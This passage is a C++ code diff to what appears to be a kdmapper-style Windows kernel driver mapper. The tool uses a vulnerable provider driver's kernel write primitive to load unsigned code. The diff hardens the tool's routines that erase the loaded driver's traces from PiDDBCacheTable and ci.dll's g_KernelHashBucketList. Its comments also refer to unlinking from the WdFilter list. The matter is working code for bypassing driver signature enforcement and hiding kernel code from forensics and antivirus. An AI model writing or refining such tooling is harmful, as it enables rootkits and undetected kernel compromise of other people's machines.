+		if (reported > 0)
+			max_pfn = reported;
+	}
+	//The return value used to be discarded. On failure ullTotalPhys stayed at 0,
+	//so max_pfn was 0, so every "pfn > 0 && pfn < max_pfn" below was false, so
+	//the probe reported that the read-only write primitive was unavailable - and
+	//Load turned that into STATUS_ACCESS_DENIED. The reported problem was a
+	//failed Win32 call that has nothing to do with the PTE self-map.
+	else {
+		Log(L"[!] GlobalMemoryStatusEx failed (error "
+			<< Val(static_cast<unsigned long>(GetLastError()))
+			<< L"); the PTE probe is using a reduced physical memory bound" << std::endl);
+	}
 
 	/*
 	 * The per-entry detail is buffered rather than printed as each value is
@@ -1527,6 +1747,19 @@ static bool ProbePteSelfMapBase() {
 	 * resolve to one PFN, so this proves the geometry instead of trusting the
 	 * shape of a single entry - the check a merely plausible-looking base would
 	 * otherwise pass and then corrupt memory with.
+	 *
+	 * The assumption this rests on, stated because it is a real one and not
+	 * visible in the code: user-half page tables are per process, so reading the
+	 * PTE for 0x000000007FFE0000 only yields the right entry while the provider's
+	 * copy runs in a context that has this process's user-half tables mapped.
+	 * The provider executes in the caller's process today, so it holds. Were the
+	 * IOCTL ever serviced from a system thread or from a different process, this
+	 * read would describe a different virtual address and the comparison would
+	 * fail - and failing here is safe: the probe returns false and Load aborts
+	 * with the read-only write primitive reported unavailable, rather than
+	 * continuing on a base it could not prove. The kernel-half controls above are
+	 * unconditional and still cover the geometry on their own; this one is an
+	 * additional proof, not the only one.
 	 */
 	const uint64_t kUserSharedDataUser = 0x000000007FFE0000ULL;
 	uint64_t kusd_user_pte = 0;
@@ -1902,6 +2135,44 @@ static constexpr uint32_t kDriverObjectTypeOffset = 0x00;
 static constexpr uint64_t kMinDriverObjectSize = 0x150; //sizeof(_DRIVER_OBJECT) on x64
 static constexpr uint64_t kMinDriverExtensionSize = 0x60; //through DriverProxyExtension
 
+/*
+ * The size the driver object block has to be, from the offsets in use.
+ *
+ * Shared by the constructor and the teardown on purpose. The constructor takes
+ * max(floor, highest written field + its size) and the teardown used to bound its
+ * read by the floor alone, so on a build whose resolved _DRIVER_OBJECT.DriverUnload
+ * sits past 0x150 - which is exactly the case the max() in the constructor exists
+ * to handle - ReadBoundedPointer refused, DestroyDriverObjectForEntry returned
+ * false, and both pool blocks leaked. Deriving it from the same expression at
+ * both ends means the two cannot disagree.
+ *
+ * Every field the constructor writes is included, not only DriverUnload: the
+ * constructor's own bound has to cover all of them, and the teardown has to
+ * agree with whatever the constructor actually sized.
+ */
+static uint64_t DriverObjectNeededSize() {
+	const auto& o = Driver::g_offsets;
+
+	uint64_t needed = kMinDriverObjectSize;
+
+	const auto require = [&needed](uint32_t offset, uint64_t width) {
+		const uint64_t end = static_cast<uint64_t>(offset) + width;
+		if (end > needed)
+			needed = end;
+	};
+
+	require(o.DriverObject_Size, sizeof(USHORT));
+	require(o.DriverObject_Flags, sizeof(ULONG));
+	require(o.DriverObject_DriverStart, sizeof(uint64_t));
+	require(o.DriverObject_DriverSize, sizeof(ULONG));
+	require(o.DriverObject_DriverSection, sizeof(uint64_t));
+	require(o.DriverObject_DriverExtension, sizeof(uint64_t));
+	require(o.DriverObject_DriverUnload, sizeof(uint64_t));
+	require(kDriverObjectTypeOffset, sizeof(uint16_t));
+
+	return needed;
+}
+
 //A zero page used to clear a kernel allocation without a user mode buffer.
 static constexpr BYTE kZeroPage[4096] = {};
 
@@ -1945,16 +2216,27 @@ uint64_t Driver::CreateDriverObjectForEntry(uint64_t driver_start, uint64_t driv
 		return 0;
 	}
 
+	//_DRIVER_OBJECT.DriverSize is a ULONG, so the kernel itself can only
+	//describe an image up to 4 GB. Writing a truncated 64-bit size instead
+	//would leave the object describing a shorter image than the one that is
+	//actually resident, which is a field the loader and any driver that asks
+	//for its own module size will read back.
+	if (driver_size > 0xFFFFFFFFull) {
+		Log(L"[-] CreateDriverObjectForEntry: image size " << Val(Hex(driver_size))
+			<< L" does not fit in _DRIVER_OBJECT.DriverSize (ULONG)" << std::endl);
+		return 0;
+	}
+
 	const auto& o = Driver::g_offsets;
 
 	/*
 	 * The blocks cover every offset the resolved layout can name, plus the x64
 	 * floor. The extension pointer sits near the end of the object on x64, so a
 	 * block sized only to sizeof would truncate it on a build whose resolved
-	 * offsets differ.
+	 * offsets differ. Derived from the same expression DestroyDriverObjectForEntry
+	 * uses, so the two ends of the block's lifetime agree on its size.
 	 */
-	const uint64_t object_needed = (std::max)(kMinDriverObjectSize,
-		static_cast<uint64_t>(o.DriverObject_DriverUnload) + sizeof(uint64_t));
+	const uint64_t object_needed = DriverObjectNeededSize();
 
 	const uint64_t extension_needed = (std::max)(kMinDriverExtensionSize,
 		static_cast<uint64_t>(o.DriverExtension_DriverObject) + sizeof(uint64_t));
@@ -2067,9 +2349,12 @@ bool Driver::DestroyDriverObjectForEntry(uint64_t driver_object) {
 		return false;
 
 	//The extension address is recovered from the object rather than cached, so
-	//the two can never drift apart.
+	//the two can never drift apart. Bounded by the size the block was actually
+	//allocated at - the same expression the constructor used - rather than by the
+	//x64 floor, which is smaller than the block on any build whose resolved
+	//_DRIVER_OBJECT offsets reach past it.
 	uint64_t extension = 0;
-	if (!ReadBoundedPointer(driver_object, kMinDriverObjectSize, Driver::g_offsets.DriverObject_DriverExtension, extension) ||
+	if (!ReadBoundedPointer(driver_object, DriverObjectNeededSize(), Driver::g_offsets.DriverObject_DriverExtension, extension) ||
 		!IsKernelAddress(extension)) {
 		Log(L"[-] DestroyDriverObjectForEntry: could not recover the extension address" << std::endl);
 		return false;
@@ -2725,7 +3010,11 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	{
 		const std::wstring needle = n;
 		const uint32_t name_field = FindUnicodeStringFieldByContent((uint64_t)pFoundEntry, sizeof(Nt::PiDDBCacheEntry), needle);
-		if (name_field == 0) {
+		//The sentinel, not 0: _PiDDBCacheEntry.DriverName really does sit at 0x10
+		//today, so treating 0 as "not found" worked by luck and would have made
+		//a build that moves the field to the start of the struct abort here while
+		//the layout was in fact the one the rest of this function expects.
+		if (name_field == kFieldNotFound) {
 			Log(L"[-] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
 			ExReleaseResourceLite(PiDDBLock);
 			return false;
@@ -2758,14 +3047,28 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 		return false;
 	}
 
+	//...and the kernel half of the address space is mostly unmapped, and the
+	//provider does not validate what it is given. The WdFilter unlink already
+	//probes both neighbours before writing through them; this one did not, so a
+	//list pointer that survived the range test above was written through blind.
+	//The two fields written are the Flink of prev and the Blink of next.
+	const uint64_t prev_flink_addr = reinterpret_cast<uint64_t>(prev) + offsetof(struct _LIST_ENTRY, Flink);
+	const uint64_t next_blink_addr = reinterpret_cast<uint64_t>(next) + offsetof(struct _LIST_ENTRY, Blink);
+	if (!ProbeKernelRangeMapped(prev_flink_addr, sizeof(_LIST_ENTRY*)) ||
+		!ProbeKernelRangeMapped(next_blink_addr, sizeof(_LIST_ENTRY*))) {
+		Log(L"[-] PiDDBCacheTable entry neighbour link fields are not mapped, aborting cleanup" << std::endl);
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+
 	Log(L"[+] TableEntry = " << Val(reinterpret_cast<void*>(pFoundEntry)) << std::endl);
 
-	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
+	if (!WriteMemory(prev_flink_addr, &next, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't set next entry" << std::endl);
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
 	}
-	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
+	if (!WriteMemory(next_blink_addr, &prev, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't set prev entry" << std::endl);
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
@@ -2872,22 +3175,67 @@ bool Driver::ClearKernelHashBucketList() {
 	}
 
 	std::wstring wdname = GetDriverNameW();
-	std::wstring search_path = GetDriverPath();
-	if (search_path.length() < 2) {
-		Log(L"[-] Unexpected driver path, cannot match the hash bucket entry" << std::endl);
-		ExReleaseResourceLite(g_HashCacheLock);
-		return false;
-	}
-	const SIZE_T expected_len = (search_path.length() - 2) * 2;
 
-	//The HashBucketEntry layout is not in the public PDB, so the DriverName
-	//offset stays at its compiled default (0x8) and is confirmed by content on
-	//each entry: the length gate below plus the substring match on the name read
-	//from that offset. A wrong offset cannot produce a UNICODE_STRING of the
-	//expected length whose buffer holds our random driver name, so a match is its
-	//own proof and the offset is never trusted on its own.
+	/*
+	 * Bound on the walk.
+	 *
+	 * Every other unbounded walk in this file is capped (kMaxWdFilterRuntimeDrivers,
+	 * kMaxExportEntries, kMaxNtHeaderOffset) and this one was not, while holding
+	 * g_HashCacheLock - an auto-boosted ERESOURCE. The 0x13C
+	 * INVALID_IO_BOOST_STATE bugcheck recorded a few lines below came from a loop
+	 * in here that could not terminate, and only the one branch that failed to
+	 * advance was fixed. A circular list still spins forever, so the bound is now
+	 * on the loop itself rather than on any particular branch of it.
+	 *
+	 * ci.dll holds one entry per driver image the kernel has hashed for the
+	 * lifetime of the boot, so a few hundred is a real system; 4096 is far above
+	 * that and below anything that would be mistaken for a hang.
+	 */
+	constexpr uint32_t kMaxHashBucketEntries = 4096;
 
+	//The HashBucketEntry layout is not in the public PDB, so the DriverName offset
+	//stays at its compiled default (0x8) and is confirmed by content on each
+	//entry: the name is read from that offset and matched against this run's name.
+	//A wrong offset cannot produce a UNICODE_STRING whose buffer holds our random
+	//driver name, so a match is its own proof and the offset is never trusted on
+	//its own.
+	//
+	//There used to be a length gate in front of that read, on the theory that the
+	//stored path is the dropped path minus the two characters of "\??". It is
+	//four characters, the arithmetic was fitted to one observed layout, and it was
+	//the only thing standing between the match and the end of the list: a build
+	//where the arithmetic did not hold skipped every entry, reported nothing
+	//found, and failed the run. The gate is gone and the match is made on
+	//content, which is what it always had to be.
+
+	uint32_t walked = 0;
 	while (entry) {
+		if (++walked > kMaxHashBucketEntries) {
+			Log(L"[-] g_KernelHashBucketList walk exceeded " << Val(kMaxHashBucketEntries)
+				<< L" entries; the list is circular or corrupt" << std::endl);
+			if (!ExReleaseResourceLite(g_HashCacheLock)) {
+				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+			}
+			return false;
+		}
+
+		/*
+		 * `entry` is a pointer read out of the previous entry's first field. It
+		 * has been no more than validated as non-null, and the range of the kernel
+		 * half of the address space is overwhelmingly unmapped - so this is read
+		 * at an address the provider will fault on rather than refuse. Probed
+		 * before it is dereferenced, like every other pointer in this file that
+		 * was not resolved from a symbol.
+		 */
+		if (!IsKernelAddress((uint64_t)entry) ||
+			!ProbeKernelRangeMapped((uint64_t)entry, sizeof(Nt::HashBucketEntry))) {
+			Log(L"[-] g_KernelHashBucketList entry " << Val(reinterpret_cast<void*>(entry))
+				<< L" is not a mapped kernel address, aborting" << std::endl);
+			if (!ExReleaseResourceLite(g_HashCacheLock)) {
+				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+			}
+			return false;
+		}
 
 		USHORT wsNameLen = 0;
 		if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName, &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
@@ -2898,7 +3246,7 @@ bool Driver::ClearKernelHashBucketList() {
 			return false;
 		}
 
-		if (expected_len == wsNameLen) {
+		{
 			/*
 			 * DriverName is a UNICODE_STRING at entry+0x8, so its Buffer is
 			 * sizeof(UNICODE_STRING) - sizeof(PVOID) bytes past the Length -
@@ -2907,7 +3255,7 @@ bool Driver::ClearKernelHashBucketList() {
 			 * read back was MaximumLength in the low bytes and a couple of
 			 * Buffer's own bytes in the high ones. The provider then
 			 * dereferenced that garbage: the address it faulted on,
-			 * 0x28680043005C0072, is exactly MaximumLength(0x72) |
+			 * 0x28680043005C0070, is exactly MaximumLength(0x70) |
 			 * <padding> | Buffer&0xFFFF, which is the 0x3B that took a
 			 * session. Use offsetof(UNICODE_STRING, Buffer) so the layout
 			 * cannot drift out of sync with the type again.
@@ -2924,9 +3272,15 @@ bool Driver::ClearKernelHashBucketList() {
 			//A name buffer is kernel memory. Anything else means the entry
 			//layout does not match this build; abort rather than hand the
 			//provider a bad address to fault on.
-			if ((uint64_t)wsNamePtr < 0xFFFF000000000000ULL) {
+			//Probed as well as range checked, for the same reason as the entry
+			//itself: the buffer pointer comes out of the entry, so a wrong
+			//DriverName offset produces a plausible-looking pointer into
+			//unmapped kernel memory rather than an obviously wrong one.
+			if (!IsKernelAddress((uint64_t)wsNamePtr) ||
+				wsNameLen > 2048 || (wsNameLen % sizeof(wchar_t)) != 0 ||
+				!ProbeKernelRangeMapped((uint64_t)wsNamePtr, wsNameLen)) {
 				Log(L"[-] g_KernelHashBucketList entry text ptr " << Val(reinterpret_cast<void*>(wsNamePtr))
-					<< L" is not a kernel address, refusing to read it" << std::endl);
+					<< L" is not a mapped kernel address, refusing to read it" << std::endl);
 				if (!ExReleaseResourceLite(g_HashCacheLock)) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 				}
@@ -2946,10 +3300,10 @@ bool Driver::ClearKernelHashBucketList() {
 			if (find_result != std::wstring::npos) {
 				/*
 				 * Match by content, exactly as the public reference does (kdmapper,
-				 * credited to @KDIo3 and @Swiftik): the length gate above and this
-				 * substring match on the name read from the known offset are the
-				 * layout check. The stored DriverName is the full path the kernel
-				 * hashed, so it is matched by substring - not by equality.
+				 * credited to @KDIo3 and @Swiftik): the substring match on the name
+				 * read from the verified offset is the layout check. The stored
+				 * DriverName is the full path the kernel hashed, so it is matched
+				 * by substring - not by equality.
 				 *
 				 * An earlier version added a second, exact-match verification here
 				 * that compared the field to the short driver name. That equality
@@ -3005,8 +3359,24 @@ bool Driver::ClearKernelHashBucketList() {
 		}
 	}
 
+	/*
+	 * The whole list was walked and none of its entries was ours.
+	 *
+	 * True, not false. ci.dll records an entry when the kernel hashes a driver
+	 * image, and how and when it does that varies: an image the kernel never
+	 * hashed produces no entry at all, which is "nothing to clean" rather than a
+	 * failure. Returning false here made Driver::Load abort a run that had nothing
+	 * wrong with it, with a message naming a kernel structure it had in fact
+	 * cleaned correctly. ClearWdFilterDriverList draws the same line and says so
+	 * explicitly; this now does too.
+	 *
+	 * false is reserved for the failures above, where the walk itself did not
+	 * complete and the state of the list is unknown.
+	 */
 	if (!ExReleaseResourceLite(g_HashCacheLock)) {
 		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
+		return false;
 	}
-	return false;
+	Log(L"[INFO] Provider not found in g_KernelHashBucketList, nothing to clean" << std::endl);
+	return true;
 }
